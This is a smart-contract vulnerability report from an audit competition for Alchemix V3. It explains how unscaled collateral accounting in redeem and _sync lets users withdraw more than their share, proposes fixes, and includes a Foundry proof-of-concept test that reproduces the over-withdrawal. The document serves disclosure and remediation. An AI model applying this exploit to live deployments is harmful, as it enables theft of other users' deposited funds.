# 57088 sc high unscaled collateral accounting in redeem lets users withdraw more than intended

**Submitted on Oct 23rd 2025 at 11:19:36 UTC by @hashbug for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57088
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Intro

The AlchemistV3 contract uses weights to keep track of earmarked debt, redeemed earmarked debt, and collateral reductions following redemption claims.

Additionally, it uses a locking mechanism to ensure proper collateralization of debt.

Due to incorrect handling of `_totalLocked` and `_collateralWeight`, the collateral left in user accounts after `_sync` will generally be higher than it should be. Users will be able to withdraw this additional collateral credited to their account that would otherwise belong to other users.

## Vulnerability Details

The collateral sent to the Transmuter is accounted for in two functions: `redeem` and `_sync`.

The `redeem` function updates the global `_totalLocked` and `_collateralWeight`. The `_sync` function utilizes `_collateralWeight` to compute the collateral to remove from individual CDPs.

The calculation in `redeem` is as follows:

```
        // move only the net collateral + fee
        uint256 collRedeemed  = convertDebtTokensToYield(amount);
        uint256 feeCollateral = collRedeemed * protocolFee / BPS;
        uint256 totalOut      = collRedeemed + feeCollateral;

        // update locked collateral + collateral weight
        uint256 old = _totalLocked;
        _totalLocked = totalOut > old ? 0 : old - totalOut;
        _collateralWeight += PositionDecay.WeightIncrement(totalOut > old ? old : totalOut, old);
```

Note, that `_totalLocked` is adjusted in the following manner (using a saturated subtraction):

```
_totalLocked -= convertDebtTokensToYield(amount) + convertDebtTokensToYield(amount) * protocolFee / BPS;
```

This is inconsistent with the way `_totalLocked` is incremented in `_addDebt` called from `mint`:

```
_totalLocked += convertDebtTokensToYield(amount) * minimumCollateralization / FIXED_POINT_SCALAR;
```

Here, the yield units are converted to locked yield units, i.e., scaled to match the overcollateralization requirement.

If a user takes on debt and transmutes that debt fully in the Transmuter, `_totalLocked` will not be sufficiently decreased during `redeem`.

Note, that in this scenario, `account.rawLocked` will still be calculated correctly in `_sync` using `account.debt`.

A mirrored issue is present in `_sync`, where `account.rawLocked` scaled using `_collateralWeight` is used to compute the `collateralToRemove`. At which point, the yield units and locked yield units are mixed up again.

The solution is likely to change

```
uint256 totalOut      = collRedeemed + feeCollateral;
```

to

```
uint256 totalOut      = (collRedeemed + feeCollateral) * minimumCollateralization / FIXED_POINT_SCALAR;
```

in `redeem`.

And to also change

```
account.collateralBalance -= collateralToRemove;
```

to

```
account.collateralBalance -= (collateralToRemove * FIXED_POINT_SCALAR) / minimumCollateralization;
```

in `_sync`.

## Impact Details

The error in `_totalLocked` will accumulate and will influence the `_collateralWeight` more and more significantly over time. In `redeem`, the weight multiplicand computation (in regular arithmetic)

```
(_totalLocked - (collRedeemed + feeCollateral))/_totalLocked
```

will tend to 1 since `_totalLocked` will be disproportionately large. Therefore, the delta between two `_collateralWeight` snapshots will tend to 0. Consequently, `collateralToRemove` in `_sync` will tend to 0.

This creates an accounting bug, where less collateral is deduced from each CDP than appropriate. Thus, users will be able to withdraw more than they should. These withdrawals eventually cannot be supported by the contract's MYT balance. Some users will never get their tokens back because other users overwithdrew. They may do it both on purpose or by accident.

## References

<https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol:L629> <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol:L1047>

This issue also plays a role in my other report "Vulnerable redemption survival ratio in \_sync allows theft of alTokens", where the accounting error can be seen as well. The effect is, however, not explainable solely by this issue, they have to be combined to produce the effect shown in the PoC of the above-mentioned report.

## Proof of Concept

## Proof of Concept

We will demonstrate the reported behavior by running two full redemption cycles from a single account (0xbeef). After the first redemption claim, `_totalLocked`is decreased incorrectly. This value is then used in the second cycle to create the leftover collateral effect.

The new test is derived from AlchemistV3Test and the main code is in `test_twoTransmutations`.

The new file **PoC.t.sol**:

```
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.28;

import {IERC20} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

import {TransparentUpgradeableProxy} from "../../lib/openzeppelin-contracts/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {SafeCast} from "../libraries/SafeCast.sol";
import {Test} from "../../lib/forge-std/src/Test.sol";
import {SafeERC20} from "../libraries/SafeERC20.sol";
import {console} from "../../lib/forge-std/src/console.sol";
import {AlchemistV3} from "../AlchemistV3.sol";
import {AlchemicTokenV3} from "../test/mocks/AlchemicTokenV3.sol";
import {Transmuter} from "../Transmuter.sol";
import {AlchemistV3Position} from "../AlchemistV3Position.sol";

import {Whitelist} from "../utils/Whitelist.sol";
import {TestERC20} from "./mocks/TestERC20.sol";
import {TestYieldToken} from "./mocks/TestYieldToken.sol";
import {TokenAdapterMock} from "./mocks/TokenAdapterMock.sol";
import {IAlchemistV3, IAlchemistV3Errors, AlchemistInitializationParams} from "../interfaces/IAlchemistV3.sol";
import {ITransmuter} from "../interfaces/ITransmuter.sol";
import {ITestYieldToken} from "../interfaces/test/ITestYieldToken.sol";
import {InsufficientAllowance} from "../base/Errors.sol";
import {Unauthorized, IllegalArgument, IllegalState, MissingInputData} from "../base/Errors.sol";
import {AlchemistNFTHelper} from "./libraries/AlchemistNFTHelper.sol";
import {IAlchemistV3Position} from "../interfaces/IAlchemistV3Position.sol";
import {AggregatorV3Interface} from "../../lib/chainlink-brownie-contracts/contracts/src/v0.8/shared/interfaces/AggregatorV3Interface.sol";
import {TokenUtils} from "../libraries/TokenUtils.sol";
import {AlchemistTokenVault} from "../AlchemistTokenVault.sol";
import {MockMYTStrategy} from "./mocks/MockMYTStrategy.sol";
import {MYTTestHelper} from "./libraries/MYTTestHelper.sol";
import {IMYTStrategy} from "../interfaces/IMYTStrategy.sol";
import {MockAlchemistAllocator} from "./mocks/MockAlchemistAllocator.sol";
import {IMockYieldToken} from "./mocks/MockYieldToken.sol";
import {IVaultV2} from "../../lib/vault-v2/src/interfaces/IVaultV2.sol";
import {VaultV2} from "../../lib/vault-v2/src/VaultV2.sol";
import {MockYieldToken} from "./mocks/MockYieldToken.sol";

contract PoCAlchemistTest is Test {
    // ----- [SETUP] Variables for setting up a minimal CDP -----

    // Callable contract variables
    AlchemistV3 alchemist;
    Transmuter transmuter;
    AlchemistV3Position alchemistNFT;
    AlchemistTokenVault alchemistFeeVault;

    // // Proxy variables
    TransparentUpgradeableProxy proxyAlchemist;
    TransparentUpgradeableProxy proxyTransmuter;

    // // Contract variables
    // CheatCodes cheats = CheatCodes(HEVM_ADDRESS);
    AlchemistV3 alchemistLogic;
    Transmuter transmuterLogic;
    AlchemicTokenV3 alToken;
    Whitelist whitelist;

    // Parameters for AlchemicTokenV2
    string public _name;
    string public _symbol;
    uint256 public _flashFee;
    address public alOwner;

    mapping(address => bool) users;

    uint256 public constant FIXED_POINT_SCALAR = 1e18;

    uint256 public constant BPS = 10_000;

    uint256 public protocolFee = 100;

    uint256 public liquidatorFeeBPS = 300; // in BPS, 3%

    uint256 public minimumCollateralization = uint256(FIXED_POINT_SCALAR * FIXED_POINT_SCALAR) / 9e17;

    // ----- Variables for deposits & withdrawals -----

    // account funds to make deposits/test with
    uint256 accountFunds;

    // large amount to test with
    uint256 whaleSupply;

    // amount of yield/underlying token to deposit
    uint256 depositAmount;

    // minimum amount of yield/underlying token to deposit
    uint256 minimumDeposit = 1000e18;

    // minimum amount of yield/underlying token to deposit
    uint256 minimumDepositOrWithdrawalLoss = FIXED_POINT_SCALAR;

    // random EOA for testing
    address externalUser = address(0x69E8cE9bFc01AA33cD2d02Ed91c72224481Fa420);

    // another random EOA for testing
    address anotherExternalUser = address(0x420Ab24368E5bA8b727E9B8aB967073Ff9316969);

    // another random EOA for testing
    address yetAnotherExternalUser = address(0x520aB24368e5Ba8B727E9b8aB967073Ff9316961);

    // another random EOA for testing
    address someWhale = address(0x521aB24368E5Ba8b727e9b8AB967073fF9316961);

    // WETH address
    address public weth = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address public protocolFeeReceiver = address(10);

    // MYT variables
    VaultV2 vault;
    MockAlchemistAllocator allocator;
    MockMYTStrategy mytStrategy;
    address public operator = address(0x2222222222222222222222222222222222222222); // default operator
    address public admin = address(0x4444444444444444444444444444444444444444); // DAO OSX
    address public curator = address(0x8888888888888888888888888888888888888888);
    address public mockVaultCollateral = address(new TestERC20(100e18, uint8(18)));
    address public mockStrategyYieldToken = address(new MockYieldToken(mockVaultCollateral));
    uint256 public defaultStrategyAbsoluteCap = 2_000_000_000e18;
    uint256 public defaultStrategyRelativeCap = 1e18; // 100%

    struct CalculateLiquidationResult {
        uint256 liquidationAmountInYield;
        uint256 debtToBurn;
        uint256 outSourcedFee;
        uint256 baseFeeInYield;
    }

    struct AccountPosition {
        address user;
        uint256 collateral;
        uint256 debt;
        uint256 tokenId;
    }

    function setUp() external {
        adJustTestFunds(18);
        setUpMYT(18);
        deployCoreContracts(18);
    }

    function adJustTestFunds(uint256 alchemistUnderlyingTokenDecimals) public {
        accountFunds = 200_000 * 10 ** alchemistUnderlyingTokenDecimals;
        whaleSupply = 20_000_000_000 * 10 ** alchemistUnderlyingTokenDecimals;
        depositAmount = 200_000 * 10 ** alchemistUnderlyingTokenDecimals;
    }

    function setUpMYT(uint256 alchemistUnderlyingTokenDecimals) public {
        vm.startPrank(admin);
        uint256 TOKEN_AMOUNT = 1_000_000; // Base token amount
        uint256 initialSupply = TOKEN_AMOUNT * 10 ** alchemistUnderlyingTokenDecimals;
        mockVaultCollateral = address(new TestERC20(initialSupply, uint8(alchemistUnderlyingTokenDecimals)));
        mockStrategyYieldToken = address(new MockYieldToken(mockVaultCollateral));
        vault = MYTTestHelper._setupVault(mockVaultCollateral, admin, curator);
        mytStrategy = MYTTestHelper._setupStrategy(address(vault), mockStrategyYieldToken, admin, "MockToken", "MockTokenProtocol", IMYTStrategy.RiskClass.LOW);
        allocator = new MockAlchemistAllocator(address(vault), admin, operator);
        vm.stopPrank();
        vm.startPrank(curator);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.setIsAllocator, (address(allocator), true)));
        vault.setIsAllocator(address(allocator), true);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.addAdapter, address(mytStrategy)));
        vault.addAdapter(address(mytStrategy));
        bytes memory idData = mytStrategy.getIdData();
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.increaseAbsoluteCap, (idData, defaultStrategyAbsoluteCap)));
        vault.increaseAbsoluteCap(idData, defaultStrategyAbsoluteCap);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.increaseRelativeCap, (idData, defaultStrategyRelativeCap)));
        vault.increaseRelativeCap(idData, defaultStrategyRelativeCap);
        vm.stopPrank();
    }

    function _magicDepositToVault(address vault, address depositor, uint256 amount) internal returns (uint256) {
        deal(address(mockVaultCollateral), address(depositor), amount);
        vm.startPrank(depositor);
        TokenUtils.safeApprove(address(mockVaultCollateral), vault, amount);
        uint256 shares = IVaultV2(vault).deposit(amount, depositor);
        vm.stopPrank();
        return shares;
    }

    function _vaultSubmitAndFastForward(bytes memory data) internal {
        vault.submit(data);
        bytes4 selector = bytes4(data);
        vm.warp(block.timestamp + vault.timelock(selector));
    }

    function deployCoreContracts(uint256 alchemistUnderlyingTokenDecimals) public {
        // test maniplulation for convenience
        address caller = address(0xdead);
        address proxyOwner = address(this);
        vm.assume(caller != address(0));
        vm.assume(proxyOwner != address(0));
        vm.assume(caller != proxyOwner);
        vm.startPrank(caller);

        // Fake tokens
        alToken = new AlchemicTokenV3(_name, _symbol, _flashFee);

        ITransmuter.TransmuterInitializationParams memory transParams = ITransmuter.TransmuterInitializationParams({
            syntheticToken: address(alToken),
            feeReceiver: address(this),
            timeToTransmute: 5_256_000,
            transmutationFee: 10,
            exitFee: 20,
            graphSize: 52_560_000
        });

        // Contracts and logic contracts
        alOwner = caller;
        transmuterLogic = new Transmuter(transParams);
        alchemistLogic = new AlchemistV3();
        whitelist = new Whitelist();

        // AlchemistV3 proxy
        AlchemistInitializationParams memory params = AlchemistInitializationParams({
            admin: alOwner,
            debtToken: address(alToken),
            underlyingToken: address(vault.asset()),
            depositCap: type(uint256).max,
            minimumCollateralization: minimumCollateralization,
            collateralizationLowerBound: 1_052_631_578_950_000_000, // 1.05 collateralization
            globalMinimumCollateralization: 1_111_111_111_111_111_111, // 1.1
            transmuter: address(transmuterLogic),
            protocolFee: 0,
            protocolFeeReceiver: protocolFeeReceiver,
            liquidatorFee: liquidatorFeeBPS,
            repaymentFee: 100,
            myt: address(vault)
        });

        bytes memory alchemParams = abi.encodeWithSelector(AlchemistV3.initialize.selector, params);
        proxyAlchemist = new TransparentUpgradeableProxy(address(alchemistLogic), proxyOwner, alchemParams);
        alchemist = AlchemistV3(address(proxyAlchemist));

        // Whitelist alchemist proxy for minting tokens
        alToken.setWhitelist(address(proxyAlchemist), true);

        whitelist.add(address(0xbeef));
        whitelist.add(externalUser);
        whitelist.add(anotherExternalUser);

        transmuterLogic.setAlchemist(address(alchemist));
        transmuterLogic.setDepositCap(uint256(type(int256).max));

        alchemistNFT = new AlchemistV3Position(address(alchemist));
        alchemist.setAlchemistPositionNFT(address(alchemistNFT));

        alchemistFeeVault = new AlchemistTokenVault(address(vault.asset()), address(alchemist), alOwner);
        alchemistFeeVault.setAuthorization(address(alchemist), true);
        alchemist.setAlchemistFeeVault(address(alchemistFeeVault));

        _magicDepositToVault(address(vault), address(0xbeef), accountFunds);
        _magicDepositToVault(address(vault), address(0xdad), accountFunds);
        _magicDepositToVault(address(vault), externalUser, accountFunds);
        _magicDepositToVault(address(vault), yetAnotherExternalUser, accountFunds);
        _magicDepositToVault(address(vault), anotherExternalUser, accountFunds);
        vm.stopPrank();

        vm.startPrank(address(admin));
        allocator.allocate(address(mytStrategy), vault.convertToAssets(vault.totalSupply()));
        vm.stopPrank();

        deal(address(alToken), address(0xdad), accountFunds);
        deal(address(alToken), address(anotherExternalUser), accountFunds);
        deal(address(vault.asset()), address(0xbeef), accountFunds);
        deal(address(vault.asset()), externalUser, accountFunds);
        deal(address(vault.asset()), yetAnotherExternalUser, accountFunds);
        deal(address(vault.asset()), anotherExternalUser, accountFunds);
        deal(address(vault.asset()), alchemist.alchemistFeeVault(), 10_000 * (10 ** alchemistUnderlyingTokenDecimals));

        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(vault.asset()), address(vault), accountFunds);
        vm.stopPrank();

        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(vault.asset()), address(vault), accountFunds);
        vm.stopPrank();

        vm.startPrank(someWhale);
        deal(address(vault), someWhale, whaleSupply);
        deal(address(vault.asset()), someWhale, whaleSupply);
        SafeERC20.safeApprove(address(vault.asset()), address(mockStrategyYieldToken), whaleSupply);
        vm.stopPrank();
    }

    //
    // Errors used in `vm.expectRevert` in the PoC
    //

    error IllegalArgument();
    error ERC20CallFailed(address target, bool success, bytes data);

    //
    // PoC code
    //

    function test_twoTransmutations() public {

        // ID tracker
        uint256 redemptionId = 0;

        // Constants
        uint256 claimSize = 1e18;
        uint256 claimFee = claimSize / 1000;
        uint256 claimYield = claimSize - claimFee;

        // IDs of user tokens in Alchemist
        uint256 beefTokenId = 1;

        // =============================================================
        //
        //                         CYCLE 1
        //
        // =============================================================

        // This first cycle will is what sets the scene.
        //
        // The redemption claim incorretly adjusts the _totalLocked and this will spill over
        // to the next cycle.

        _depositBeef(10e18, 0);
        _mintBeef(claimSize, beefTokenId);
        _createRedemptionBeef(claimSize);
        ++redemptionId;
        _transmuteBeef(redemptionId);
        // Note, that here, _totalLocked is 1.11..e17 even though all of the contract balance
        // has been withdrawn and there is nothing locked for the only user account.
        //
        // We withdraw everything to demonstrate the cleanness of the account.
        _withdrawBeef(9e18, beefTokenId);

        (uint256 collateral, uint256 debt,) = alchemist.getCDP(beefTokenId);
        assertEq(collateral, 0, "There should be no collateral for 0xbeef.");
        assertEq(debt, 0, "There should be no debt for 0xbeef.");
        assertEq(vault.balanceOf(address(alchemist)), 0, "Alchemist should hold no MYT shares at this point");

        // An additional withdraw reverts with IllegalArgument as expected, because the account is empty.
        vm.expectRevert(IllegalArgument.selector);
        _withdrawBeef(1, beefTokenId);

        // =============================================================
        //
        //                         CYCLE 2
        //
        // =============================================================

        // Here, the leftover _totalLocked influences the computation.
        //
        // We end up with more collateral than we should.

        _depositBeef(10e18, beefTokenId);
        _mintBeef(claimSize, beefTokenId);
        _createRedemptionBeef(claimSize);
        ++redemptionId;
        _transmuteBeef(redemptionId);
        _withdrawBeef(9e18, beefTokenId);

        (collateral, debt,) = alchemist.getCDP(beefTokenId);
        // This assert is different to the last one - at this point, remaining collateral will not be zero even though
        // the contract balance is.
        assertNotEq(collateral, 0, "There should be collateral leftover for 0xbeef.");
        assertEq(debt, 0, "There should be no debt for 0xbeef.");
        assertEq(vault.balanceOf(address(alchemist)), 0, "Alchemist should hold no MYT shares at this point");

        // An additional attempted withdraw reverts with a panic instead of IllegalArgument.
        //
        // If there was another user, the withdraw would succeed letting 0xbeef steal collateral that does not
        // belong to it.
        vm.expectRevert(
            abi.encodeWithSelector(
                ERC20CallFailed.selector,
                address(vault),
                false,
                // 0x11 underflow panic because the contract does not have any balance
                abi.encodeWithSignature("Panic(uint256)", 0x11)
            )
        );
        _withdrawBeef(1, beefTokenId);

        uint256 accountingError = 90909090909090909;

        // Here, we see that 0xbeef can withdraw more than intended.
        _depositDad(accountingError, 0);
        _withdrawBeef(accountingError, beefTokenId);
    }

    //
    // Named internals, so that the PoC can be read more easily
    //

    function _depositBeef(uint256 amount, uint256 tokenId) internal {
        _deposit(address(0xbeef), amount, tokenId);
    }

    function _mintBeef(uint256 amount, uint256 tokenId) internal {
        _mint(address(0xbeef), amount, tokenId);
    }

    function _createRedemptionBeef(uint256 amount) internal {
        _createRedemption(address(0xbeef), amount);
    }

    function _claimRedemptionBeef(uint256 transmutationId) internal {
        _claimRedemption(address(0xbeef), transmutationId);
    }

    function _transmuteBeef(uint256 transmutationId) internal {
        _transmute(address(0xbeef), transmutationId);
    }

    function _withdrawBeef(uint256 amount, uint256 tokenId) internal {
        _withdraw(address(0xbeef), amount, tokenId);
    }

    function _deposit(address account, uint256 amount, uint256 tokenId) internal {
        vm.startPrank(account);
        console.log(vault.balanceOf(account));
        SafeERC20.safeApprove(address(vault), address(alchemist), amount);
        alchemist.deposit(amount, account, tokenId);
        vm.stopPrank();
    }

    function _mint(address account, uint256 amount, uint256 tokenId) internal {
        vm.startPrank(account);
        alchemist.mint(tokenId, amount, account);
        vm.stopPrank();
    }

    function _createRedemption(address account, uint256 amount) internal {
        vm.startPrank(account);
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), amount);
        transmuterLogic.createRedemption(amount);
        vm.stopPrank();
    }

    function _claimRedemption(address account, uint256 transmutationId) internal {
        vm.prank(account);
        transmuterLogic.claimRedemption(transmutationId);
    }

    function _transmute(address account, uint256 transmutationId) internal {
        // Wait for transmutation
        vm.roll(block.number + transmuterLogic.timeToTransmute());
        // Claim
        vm.prank(account);
        transmuterLogic.claimRedemption(transmutationId);
    }

    function _withdraw(address account, uint256 amount, uint256 tokenId) internal {
        vm.prank(account);
        alchemist.withdraw(amount, account, tokenId);
    }
}

```
